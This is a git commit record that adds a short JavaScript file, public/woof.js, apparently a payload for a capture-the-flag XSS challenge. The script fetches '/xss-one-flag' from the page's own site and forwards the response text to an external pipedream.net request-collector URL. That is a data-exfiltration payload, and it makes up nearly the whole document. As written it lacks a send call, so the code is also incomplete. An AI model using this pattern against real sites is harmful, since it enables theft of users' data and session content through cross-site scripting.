d8c6247f94d070c24081139e9470358827e111c3
Zhongbob <89343697+Zhongbob@users.noreply.github.com>
2024-05-04 22:56:10 +0800

    woof.js

---
+++ public/woof.js
@@ -0,0 +1,16 @@
+var xhr = new XMLHttpRequest();
+xhr.onload = function() {
+    // Check if the request was successful
+    if (xhr.status >= 200 && xhr.status < 300) {
+        // Parse the response if needed or directly use it
+        fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?"+xhr.responseText)
+    } else {
+        // Handle errors, for example, display a message or log it
+        console.log('The request failed with status:', xhr.status);
+    }
+};
+
+
+xhr.open('GET','/xss-one-flag',true);
+
+
